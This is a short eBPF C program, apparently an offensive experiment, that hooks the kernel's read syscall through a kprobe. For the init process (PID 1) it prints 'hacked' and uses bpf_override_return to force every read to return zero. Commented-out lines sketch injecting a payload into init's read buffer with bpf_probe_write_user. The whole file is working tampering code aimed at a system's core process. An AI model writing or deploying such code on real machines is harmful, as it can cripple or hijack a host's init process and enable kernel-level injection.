#define __x86_64__
//#include <bpf/bpf.h>
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>

#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

// the function should in ALLOW_ERROR_INJECTION when use bpf_override_return
SEC("kprobe/__x64_sys_read")
int kprobe_unix_stream_recvmsg(struct pt_regs *ctx)
{

    int pid = bpf_get_current_pid_tgid() >> 32;
    if (pid != 1) {
        return 0;
    }

    // struct pt_regs * __ctx = (struct pt_regs *)PT_REGS_PARM1_CORE(ctx);
    // if (!__ctx) {
    //      bpf_printk("failed to load original ctx");
    //      return 0;
    // }
    // void *read_buf= (void *)PT_REGS_PARM2_CORE(__ctx);

    // char payload[]="";
    // int ret = bpf_probe_write_user(read_buf, payload, sizeof(payload));
    // if (ret != 0){
    //     bpf_printk("failed to write user:%d\n", ret) ;
    // }
    bpf_printk("hacked\n") ;
    bpf_override_return(ctx, 0);
    return 0;
}

char __license[] __attribute__((section("license"), used)) = "GPL";
